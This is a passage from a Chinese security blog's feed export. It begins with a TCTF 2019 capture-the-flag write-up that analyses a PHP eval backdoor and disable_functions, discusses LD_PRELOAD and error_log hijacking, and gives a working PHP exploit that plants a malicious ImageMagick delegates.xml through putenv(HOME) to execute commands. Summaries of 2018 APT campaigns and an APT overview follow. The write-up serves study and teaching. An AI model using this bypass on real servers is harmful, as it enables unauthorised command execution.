html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;pre class=&quot;pre&quot;&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.So I installed php-imagick in the server, opened a `backdoor` for you.Let&apos;s try to execute `/readflag` to get the flag.Open basedir: &lt;?php echo ini_get(&apos;open_basedir&apos;);?&gt;&lt;?php eval($_POST[&quot;backdoor&quot;]);?&gt;Hint: eval($_POST[&quot;backdoor&quot;]);&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;</code></pre><p>根据提示出题人的意图是让我们利用 Imagick 这个 PHP 库去 Bypass，但是不管怎么样还是要看一下 phpinfo 中的 disable_functions</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp5.png" alt="此处输入图片的描述"></p><p>复制出来就是下面的样子</p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</code></pre><p><strong>对比一下我之前总结过得一个列表(如下)可以看到出题人将 pcntl 过滤的比较完全了，</strong></p><pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter</code></pre><p><strong>(我这里还需要加一个syslog、imap_open，ld -&gt;这个很明显是出题人写错了应该是 dl map_open 我发现我写错了，根本没这个函数)</strong></p><p><strong>下面是出题人没有过滤到的</strong>，我们可以尝试利用一下，看看有没有突破的希望    </p><pre><code>putenv、apache_setenv、mb_send_mail、assert、set_time_limit、ignore_user_abort、ini_set、ini_alter、dl、imap_mail</code></pre><p>当然在利用之前，我们还是要看一下 PHP 目前安装了哪些组件，因为有些利用方式是依赖于特殊组件的，并且要明确 <strong>php 的版本是 7.2.15</strong>，这两个限制就能排除一些可能</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp6.png" alt="此处输入图片的描述"></p><p><strong>排除一些可能：</strong></p><p>dl —————————————&gt;  php 7.0.0 在 PHP-FPM 模式下已禁用 dl()<br>imap_mail ——————————&gt; 没有安装对应组件并且已经禁用 imap_open<br>mb_send_mail  ————————–&gt; mbstring 不是一个默认扩展<br>assert        ———————————–&gt; 属于代码执行，暂时不考虑<br>ignore_user_abort  —————————&gt; 默认不开启,但这里能配合 ini_set 生效，但是不能直接执行命令<br>ini_set        ——————————&gt; 能修改的实际上很少必须要满足<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">选项模式</a>为 PHP_INI_USER 或者 PHP_INI_ALL (<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">这里</a>是参数的修改范围列表)<br>set_time_limit   —————————–&gt; 并不能直接执行命令</p><blockquote><p><strong>注：一些能使用 ini_set 修改的高危配置</strong></p><p>open_basedir  ———–出题人在文件一开始设置了这个选项，后来我再设置发现并没有办法覆盖<br>error_log  设置脚本错误将被记录到的文件<br>include_path<br>session.save_path</p></blockquote><p><strong>研究：</strong></p><p>error log 能触发 sendmail (服务器有安装 sendmail，只是禁用了 mail)<br>ffmpeg</p><p><strong>其实看了一圈，最惹人注目的还是 putenv 了</strong>，出题人不可能不知道这个函数的厉害，没有禁用估计就是利用这个没问题了，我们原来的利用方式是结合 LD_PRELOAD 劫持 getuid ，然后结合 mail() 函数调用 sendmail再调用 getuid 实现命令执行(<strong>而这个攻击方法的本质是php的函数在运行的时候会去调动系统命令创建进程，新的进程又能调用系统函数，然后我们就能劫持这个系统函数</strong>)</p><p><strong>比如我们编辑一个 mail.php</strong></p><pre><code>&lt;?php    mail(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;);?&gt;</code></pre><p>然后去使用 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 去追踪一下内部的进程创建</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp11.png" alt="此处输入图片的描述"></p><p>可以看到，Mail 函数调用了 /usr/bin/sendmail，sendmail 可能会加载的函数中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp12.png" alt="此处输入图片的描述"></p><p>并且在实际的调用中，确实也加载了这个函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp13.png" alt="此处输入图片的描述"></p><p>至此，我们应该已经很清楚原始的攻击方法的思路了，我们如果劫持了 getuid() 以后再在 php 中调用 mail() 函数，那么我们自定义的getuid()函数就会被执行,从而成功执行系统命令。</p><p>但是 mail 在这里被禁了，我们只能自己去挖掘别的函数了。</p><h3 id="2-第一种思路—-gt-寻找别的函数"><a href="#2-第一种思路—-gt-寻找别的函数" class="headerlink" title="2.第一种思路—&gt; 寻找别的函数"></a><strong>2.第一种思路—&gt; 寻找别的函数</strong></h3><p>上面说了本来的 mail() 是可以的，还有 mb_send_mail() 、imap_mail ()、ffmpeg 也是可以的，但是后面三个都不是内置的默认存在的组件，都需要环境安装才行，所以我们只能再去找更隐蔽的，于是 error_log() 这个函数出现了</p><p>我们来看一下 error_log 的参数：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp26.png" alt="此处输入图片的描述"></p><p>可以看到，这函数是支持向邮箱发送信息的，并且调用的是和 mail() 底层相同的函数，这不是明显说的是 sendmail ,我们来测试一下</p><p><strong>mail.php</strong></p><pre><code>&lt;?phperror_log(&quot;a&quot;,1,&quot;test@163.com&quot;,&quot;1&quot;);?&gt;</code></pre><p>然后我们来追踪一下函数调用情况</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp27.png" alt="此处输入图片的描述"></p><p>说明在这样的禁用 mail 的环境下我们是可以使用 error_log 进行劫持的</p><h3 id="3-第二种思路—-gt-劫持共享库"><a href="#3-第二种思路—-gt-劫持共享库" class="headerlink" title="3.第二种思路—&gt; 劫持共享库"></a><strong>3.第二种思路—&gt; 劫持共享库</strong></h3><p>后来发现我们可以不劫持具体的函数，我们可以直接劫持共享库，思路来源<a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">是这里</a>，那么现在问题就简化成了我们只要能找到一个 php 的函数，这个函数在调用的时候能执行一个系统中自带的二进制文件就可以了(注意，不是 /usr/bin/php 这个文件是 php 引擎的启动文件)</p><h3 id="4-第三种思路—-gt-篡改环境变量"><a href="#4-第三种思路—-gt-篡改环境变量" class="headerlink" title="4.第三种思路—&gt; 篡改环境变量"></a><strong>4.第三种思路—&gt; 篡改环境变量</strong></h3><p>不用多说，预期解肯定是和 imagick 这个库有关系，正如上面我引用的那篇文章中说的 Bypass disable_functions 的思路一共有以下四种的话：</p><p><strong>1.攻击后端组件：</strong>寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br><strong>2.寻找未禁用的漏网函数：</strong>常见的执行命令的函数有system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br><strong>3.mod_cgi 模式：</strong>尝试修改 .htaccess，调整请求访问路由，绕过 php.ini中的任何限制；<br><strong>4.利用环境变量：</strong> LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>这里的官方解利用就一定是第一种方法，其实就是一种：“<strong>你禁用我 php 执行命令，但是你禁用不了 Imagick 执行命令</strong>” 的思想，那么如果 imagick 执行的命令我们是可控的，那么我们就成功了。</p><p>我们唯一的办法就是从整个组件的<a href="https://imagemagick.org/index.php" target="_blank" rel="noopener">官网介绍</a>，和<a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="noopener">源码</a>中找到蛛丝马迹，后来在 <a href="https://imagemagick.org/source/delegates.xml" target="_blank" rel="noopener">这里</a>  我们可以找到 imagick 的文件格式转换的配置文件</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp8.png" alt="此处输入图片的描述"></p><p>看一下这个 xml 自己的说明</p><pre><code>Delegate command file. Commands which specify   decode=&quot;in_format&quot; encode=&quot;out_format&quot; specify the rules for converting from in_format to out_format.  Use these rules to translate directly between formats. Commands which specify only   decode=&quot;in_format&quot; specify the rules for converting from in_format to some format that ImageMagick automatically recognizes. Use these rules to decode formats. Commands which specify only  encode=&quot;out_format&quot; specify the rules for an &quot;encoder&quot; which may accept any input format. The substitution rules are as follows:   %a  authentication passphrase   %b  image file size in bytes   %g  image geometry   %h  image rows (height)   %i  input image filename   %#  input image signature   %m  input image format   %o  output image filename   %p  page number   %q  input image depth   %s  scene number   %u  unique temporary filename   %w  image columns (width)   %x  input image x resolution   %y  input image y resolution Set option delegate:bimodal=true to process bimodal delegates otherwise they are ignored. If stealth=&quot;True&quot; the delegate is not listed in user requested &quot;-list delegate&quot; listings. These are typically special internal delegates. If spawn=&quot;True&quot;, ImageMagick does not wait for the delegate to finish, nor will it read any output image.</code></pre><p>很明显，在图片进行格式转换的时候会执行 command 参数后面的命令，但是问题出现了，这个是全局的配置文件，我们有办法覆盖吗？那我们还是要从根源上去找，github 读有关文件格式转化的源码，看有没有我们利用的可能</p><p><strong>我们从 quickstart.txt 中找到了<a href="https://github.com/ImageMagick/ImageMagick/blob/826cbebfe562ac9160a3cb4316b4e4bed61203cb/QuickStart.txt#L72" target="_blank" rel="noopener">这样的话</a></strong></p><pre><code>Configuration Files      ImageMagick depends on a number of external configuration files which      include colors.xml, delegates.xml, and others.      ImageMagick searches for configuration files in the following order, and      loads them if found:          $MAGICK_CONFIGURE_PATH          $MAGICK_HOME/etc/ImageMagick          $MAGICK_HOME/share/ImageMagick-7.0.2/config          $HOME/.config/ImageMagick/          &lt;client path&gt;/etc/ImageMagick/          &lt;current directory&gt;/</code></pre><p>也就是说，其加载的 delegates.xml 是有一个默认的寻找位置的，我们先去环境中读取一下， 看看原来的环境变量设置什么(我们直接执行 phpinfo();)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp9.png" alt="此处输入图片的描述"></p><p>我们发现只有 HOME 这么一个环境变量，也就是说 <code>$MAGICK_CONFIGURE_PATH</code>、<code>$MAGICK_HOME</code> 都找不到我们的配置文件，那接下来就轮到 <code>$HOME</code> 了，我们现在只要能将 $HOME 改成我们可控的目录(在这里是出题人规定的 /tmp/md5(ip))，然后创建对应的.config/ImageMagick/ 目录，然后再是将我们自定义的配置文件放在该目录下等到调用 文件格式修改的函数的时候就会加载我们恶意的配置文件，然后成功命令执行，而环境变量的修改出题人也给我们留了 putenv 这个函数，现在一切都梳理清楚了</p><p><strong>给出 exp</strong> </p><pre><code>$home = &apos;/tmp/7087afd091c14610b696f6d551930014&apos;;ini_set(&apos;display_errors&apos;, 1); //mkdir(&quot;$home/.magick/&quot;);mkdir(&quot;$home/.config/&quot;);mkdir(&quot;$home/.config/ImageMagick&quot;);//file_put_contents(&quot;$home/.magick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);file_put_contents(&quot;$home/.config/ImageMagick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);touch(&quot;$home/test.foo&quot;);$_ENV[&apos;HOME&apos;] = $home;var_dump(putenv(&quot;HOME=$home/&quot;));var_dump(getenv(&quot;HOME&quot;));try {  $i = new Imagick(&quot;$home/test.foo&quot;);  $i-&gt;writeImage(&quot;$home/test.png&quot;);} catch(Exception $e) {  var_dump($e);}var_dump(file_get_contents(&quot;$home/flag&quot;));</code></pre><p><strong>运行结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp10.png" alt="此处输入图片的描述"></p><h3 id="3-第三种思路：监控-tmp-目录"><a href="#3-第三种思路：监控-tmp-目录" class="headerlink" title="3.第三种思路：监控 /tmp 目录"></a><strong>3.第三种思路：监控 /tmp 目录</strong></h3><p>因为一开始出题人没有设置每个人的 tmp ，这让大家都是在一个 tmp 目录下混战，如图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp3.png" alt="此处输入图片的描述"></p><p>于是就有师傅们就有了各种各样的骚想法</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp24.png" alt="此处输入图片的描述"></p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a href="https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/" target="_blank" rel="noopener">https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/</a><br><a href="https://www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/166695.html</a><br><a href="https://jolokia.org/reference/html/protocol.html#request-response" target="_blank" rel="noopener">https://jolokia.org/reference/html/protocol.html#request-response</a><br><a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw</a><br><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/" target="_blank" rel="noopener">https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/</a><br><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a><br><a href="http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc</a><br><a href="https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html</a><br><a href="https://www.cnblogs.com/dongguacai/p/5900507.html" target="_blank" rel="noopener">https://www.cnblogs.com/dongguacai/p/5900507.html</a><br><a href="https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/" target="_blank" rel="noopener">https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/</a><br><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a><br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;TCTF 2019 来了，2018 年线上赛的几道 CSP 令人记忆犹新，但是当时太菜并做不出来，final 也没有什么 web 题，被教做人，2019 又会有什么样的惊喜呢，又能学到什么新知识呢，简单记录一下解题思路。&lt;/p&gt;
&lt;h2 id=&quot;0X01-Ghost-Pepper&quot;&gt;&lt;a href=&quot;#0X01-Ghost-Pepper&quot; class=&quot;headerlink&quot; title=&quot;0X01 Ghost Pepper&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 Ghost Pepper&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-题目概览&quot;&gt;&lt;a href=&quot;#1-题目概览&quot; class=&quot;headerlink&quot; title=&quot;1.题目概览&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.题目概览&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;访问页面需要 &lt;a href=&quot;https://segmentfault.com/a/1190000004406025//www.freebuf.com/vuls/166695.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;basic 认证&lt;/a&gt;，然后抓包看到响应中有认证的提示&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WWW-Authenticate: BASIC realm=&amp;quot;karaf&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们尝试使用 karaf:karaf 登录，发现登录成功&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://www.k0rz3n.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://www.k0rz3n.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2018 APT (Advanced Persistent Threat)攻击大事件</title>
    <link href="https://www.k0rz3n.com/2019/03/23/2018%20APT%20(Advanced%20Persistent%20Threat)%E6%94%BB%E5%87%BB%E5%A4%A7%E4%BA%8B%E4%BB%B6/"/>
    <id>https://www.k0rz3n.com/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/</id>
    <published>2019-03-23T11:28:18.000Z</published>
    <updated>2019-04-28T15:49:22.889Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-韩国平昌冬奥会APT攻击事件"><a href="#1-韩国平昌冬奥会APT攻击事件" class="headerlink" title="1.韩国平昌冬奥会APT攻击事件"></a><strong>1.韩国平昌冬奥会APT攻击事件</strong></h3><p><strong>攻击入口：</strong>鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌恶意宏的Word文档</p><p>2.利用PowerShell实现的图片隐写技术，其使用开源工具Invoke-PSImage实现</p><p>3.利用失陷网站用于攻击载荷的分发和控制回传</p><p>4.伪装成韩国国家反恐中心（NCTC）的电子邮件地址发送鱼叉邮件，以及注册伪装成韩国农业和林业部的恶意域名</p><a id="more"></a><h3 id="2-VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件"><a href="#2-VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件" class="headerlink" title="2.VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件"></a><strong>2.VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件</strong></h3><p><strong>攻击入口：</strong>利用IOT设备漏洞远程获得初始控制权</p><p><strong>主要攻击战术技术：</strong></p><p>1.使用多阶段的载荷植入，不同阶段载荷功能模块实现不同</p><p>2.使用针对多种型号IOT设备的公开漏洞利用技术和默认访问凭据获得对设备的控制权</p><p>3.实现包括：数据包嗅探、窃取网站登录凭据、以及监控Modbus SCADA工控协议</p><p>4.针对多种CPU架构编译和执行</p><p>5.使用Tor或SSL加密协议进行C2通信</p><h3 id="3-APT28针对欧洲、北美地区的一系列定向攻击事件"><a href="#3-APT28针对欧洲、北美地区的一系列定向攻击事件" class="headerlink" title="3.  APT28针对欧洲、北美地区的一系列定向攻击事件"></a><strong>3.  APT28针对欧洲、北美地区的一系列定向攻击事件</strong></h3><p><strong>相关漏洞：</strong>Office文档模板注入、疑似Lojack软件缺陷或0day漏洞</p><p><strong>攻击入口</strong>：鱼叉邮件、Office模板注入</p><p>主要攻击战术技术：</p><p>1.鱼叉邮件发送使用了Office模板注入攻击技术的恶意文档</p><p>2.远程注入恶意宏代码并执行</p><p>3.释放Delphi版的Cannon和.Net和C#等多个语言版本的Zebrocy木马进行远程控制</p><p>4.以及针对LoJack计算机防盗软件植入UEFI rootkit木马程序，实现重装系统及更换硬盘都无法消除的持久化远程控制</p><h3 id="4-蓝宝菇APT组织针对中国的一系列定向攻击事件"><a href="#4-蓝宝菇APT组织针对中国的一系列定向攻击事件" class="headerlink" title="4.蓝宝菇APT组织针对中国的一系列定向攻击事件"></a><strong>4.蓝宝菇APT组织针对中国的一系列定向攻击事件</strong></h3><p>相关漏洞：无</p><p><strong>攻击入口：</strong>鱼叉邮件和水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌PowerShell脚本的LNK文件，并利用邮件服务器的云附件方式进行投递</p><p>2.当受害者被诱导点击恶意LNK文件后，会执行LNK文件所指向的PowerShell命令，进而提取出LNK文件中的其他诱导文件、持久化后门和PowerShell后门脚本。<strong>PowerShell后门</strong>会通过对受害者的电脑中的特定格式文件进行打包并上传到第三方云空间（如：亚马逊云，新浪云等）</p><p>3.从网络上接受新的PowerShell后门代码执行，从而躲避了一些杀软的查杀</p><h3 id="5-海莲花APT组织针对我国和东南亚地区的定向攻击事件"><a href="#5-海莲花APT组织针对我国和东南亚地区的定向攻击事件" class="headerlink" title="5.海莲花APT组织针对我国和东南亚地区的定向攻击事件"></a><strong>5.海莲花APT组织针对我国和东南亚地区的定向攻击事件</strong></h3><p><strong>相关漏洞：</strong>微软Office漏洞、MikroTik路由器漏洞、永恒之蓝漏洞</p><p><strong>攻击入口：</strong>鱼叉邮件和水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌恶意宏的Word文件、HTA文件、快捷方式文件、SFX自解压文件、捆绑后的文档图标的可执行文件等</p><p>2.入侵成功后通过一些内网渗透工具扫描渗透内网并横向移动，入侵重要服务器，植入Denis家族木马进行持久化控制</p><p>3.通过横向移动和渗透拿到域控或者重要的服务器权限，通过对这些重要机器的控制来设置水坑、利用第三方工具并辅助渗透</p><p>4.横向移动过程中还会使用一些逃避杀软检测的技术：包括白利用技术、PowerShell混淆技术等</p><h3 id="6-蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件"><a href="#6-蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件" class="headerlink" title="6.蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件"></a><strong>6.蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件</strong></h3><p><strong>相关漏洞：</strong>InPage文字处理软件漏洞CVE-2017-12824、微软公式编辑器漏洞等</p><p><strong>攻击入口：</strong>鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌Inpage漏洞利用文档、微软公式编辑器漏洞利用文档、伪造成文档/图片的可执行文件等</p><p>2.触发漏洞后释放/下载执行恶意木马，与C2保持通信，并根据C2返回的命令下载指定插件执行</p><p>3.下载执行多种远控插件进行远程控制</p><h3 id="7-APT38针对全球范围金融机构的攻击事件"><a href="#7-APT38针对全球范围金融机构的攻击事件" class="headerlink" title="7.APT38针对全球范围金融机构的攻击事件"></a><strong>7.APT38针对全球范围金融机构的攻击事件</strong></h3><p><strong>攻击入口：</strong>鱼叉攻击，水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.利用社交网络<strong>，搜索等多种方式对攻击目标进行详细的网络侦查</strong></p><p>2.使用鱼叉攻击或水坑攻击<strong>对目标人员实施攻击并获得初始控制权</strong></p><p>3.在目标网络横向移动，最终以获得SWIFT系统终端为目标</p><p>4.伪造或修改交易数据达到窃取资金</p><p>5.通过格式化硬盘或日志等方式清除痕迹。</p><h3 id="8-疑似DarkHotel-APT组织利用多个IE-0day“双杀”漏洞的定向攻击事件"><a href="#8-疑似DarkHotel-APT组织利用多个IE-0day“双杀”漏洞的定向攻击事件" class="headerlink" title="8.疑似DarkHotel APT组织利用多个IE 0day“双杀”漏洞的定向攻击事件"></a><strong>8.疑似DarkHotel APT组织利用多个IE 0day“双杀”漏洞的定向攻击事件</strong></h3><p><strong>相关漏洞：</strong>CVE-2018-8174、CVE-2018-8373等</p><p><strong>攻击入口：</strong>鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递包含IE 0day双杀漏洞的Word文档</p><p>2.漏洞利用成功后释放<strong>白利用文件(例如Radmin、TeamView、FreeSSH等。因为是合法程序，所以AV不会清除)</strong>执行恶意PowerShell下载下一阶段PowerShell脚本</p><p>3.下载回来的PowerShell脚本进行Bypass UAC，并通过劫持系统DLL文件下载核心木马模块</p><p>4.核心木马模块与C2地址通信下载执行更多的木马插件实现持久化控制</p><p><strong>9.疑似APT33使用Shamoon V3针对中东地区能源企业的定向攻击事件</strong></p><p><strong>攻击入口：</strong>鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.使用随机生成的数据覆盖系统上的MBR、分区和文件</p><p>2.恶意文件的文件描述模仿合法的产品名称</p><h3 id="10-Slingshot：一个复杂的网络间谍活动"><a href="#10-Slingshot：一个复杂的网络间谍活动" class="headerlink" title="10.Slingshot：一个复杂的网络间谍活动"></a><strong>10.Slingshot：一个复杂的网络间谍活动</strong></h3><p><strong>相关漏洞：</strong>CVE-2007-5633、CVE-2010-1592、CVE-2009-0824</p><p><strong>攻击入口：</strong>可能通过Windows漏洞利用或已感染的Mikrotik路由器</p><p><strong>主要攻击战术技术：</strong></p><p>1.初始loader程序将合法的Windows库‘scesrv.dll’替换为具有完全相同大小的恶意文件</p><p>2.包括内核层的加载器和网络嗅探模块，自定义的文件系统模块</p><p>3.可能通过Windows漏洞利用或已感染的Mikrotik路由器获得受害目标的初始控制权。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-韩国平昌冬奥会APT攻击事件&quot;&gt;&lt;a href=&quot;#1-韩国平昌冬奥会APT攻击事件&quot; class=&quot;headerlink&quot; title=&quot;1.韩国平昌冬奥会APT攻击事件&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.韩国平昌冬奥会APT攻击事件&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击入口：&lt;/strong&gt;鱼叉邮件攻击&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要攻击战术技术：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.鱼叉邮件投递内嵌恶意宏的Word文档&lt;/p&gt;
&lt;p&gt;2.利用PowerShell实现的图片隐写技术，其使用开源工具Invoke-PSImage实现&lt;/p&gt;
&lt;p&gt;3.利用失陷网站用于攻击载荷的分发和控制回传&lt;/p&gt;
&lt;p&gt;4.伪装成韩国国家反恐中心（NCTC）的电子邮件地址发送鱼叉邮件，以及注册伪装成韩国农业和林业部的恶意域名&lt;/p&gt;
    
    </summary>
    
      <category term="APT" scheme="https://www.k0rz3n.com/categories/APT/"/>
    
    
      <category term="APT" scheme="https://www.k0rz3n.com/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>APT(高级持续威胁) 概念以及趋势概述</title>
    <link href="https://www.k0rz3n.com/2019/03/21/APT(%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81)%20%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%B6%8B%E5%8A%BF%E6%A6%82%E8%BF%B0/"/>
    <id>https://www.k0rz3n.com/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/</id>
    <published>2019-03-21T11:28:18.000Z</published>
    <updated>2019-04-28T15:47:53.253Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-概念："><a href="#0X01-概念：" class="headerlink" title="0X01 概念："></a><strong>0X01 概念：</strong></h2><p>APT，又称<strong>高级持续性威胁</strong>，通常<strong>用于区分由国家、政府或情报机构资助或具有相关背景的攻击团伙实施的攻击行动</strong>。该类攻击行动的动机往往与地缘<strong>政治冲突，军事行动</strong>相关，并以<strong>长久性的情报刺探、收集和监控</strong>为主要意图，其主要攻击的目标除了<strong>政府、军队、外交相关部门外，也包括科研、海事、能源、高新技术</strong>等领域。 </p><h2 id="0X02-高级持续性威胁背后的攻击者"><a href="#0X02-高级持续性威胁背后的攻击者" class="headerlink" title="0X02 高级持续性威胁背后的攻击者"></a><strong>0X02 高级持续性威胁背后的攻击者</strong></h2><h3 id="1-APT28"><a href="#1-APT28" class="headerlink" title="1.APT28"></a><strong>1.APT28</strong></h3><p><strong>Zebrocy 是APT28 专用的攻击工具集</strong>，主要目的是用作侦察（收集上传系统信息和截屏）和部署下一阶段的攻击载荷。Zebrocy 包含了.NET、AutoIT、Delphi、C++、PowerShell 和Go 等多种语言开发形态。安全厂商也发现该组织使用新的攻击恶意代码Cannon，<strong>其使用邮件协议作为C2的通信方式。</strong></p><h3 id="2-APT29"><a href="#2-APT29" class="headerlink" title="2.APT29"></a><strong>2.APT29</strong></h3><p>其实施鱼叉攻击是用于投放恶意的LNK文件，其中利用了该组织特有的一种LNK文件格式的利用技术。该组织木马会执行内嵌的PowerShell脚本命令,<strong>并从LNK 文件附加的数据中解密释放恶意载荷和诱导的PDF 文档文件</strong>。</p><a id="more"></a><h3 id="3-Lazarus-Group"><a href="#3-Lazarus-Group" class="headerlink" title="3.Lazarus Group"></a><strong>3.Lazarus Group</strong></h3><h3 id="4-肚脑虫（APT-C-35）"><a href="#4-肚脑虫（APT-C-35）" class="headerlink" title="4.肚脑虫（APT-C-35）"></a><strong>4.肚脑虫（APT-C-35）</strong></h3><p>其主要<strong>针对巴基斯坦和克什米尔地区</strong>的目标人员。该组织使用了两种特定的攻击恶意框架，EHDevel 和 yty，命名取自恶意代码中的 PDB 